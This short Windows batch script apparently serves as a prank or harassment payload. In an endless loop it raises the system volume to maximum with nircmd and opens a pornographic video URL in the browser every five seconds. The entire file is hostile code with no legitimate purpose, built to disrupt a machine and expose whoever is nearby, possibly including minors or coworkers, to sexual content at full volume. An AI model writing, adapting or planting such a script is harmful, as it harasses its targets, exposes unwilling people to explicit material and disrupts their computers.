@echo off

:loop
nircmd.exe setsysvolume 65535
start "" "https://www.pornhub.com/view_video.php?viewkey=67832a6086b7e#1"
timeout /t 5 /nobreak > nul
goto loop
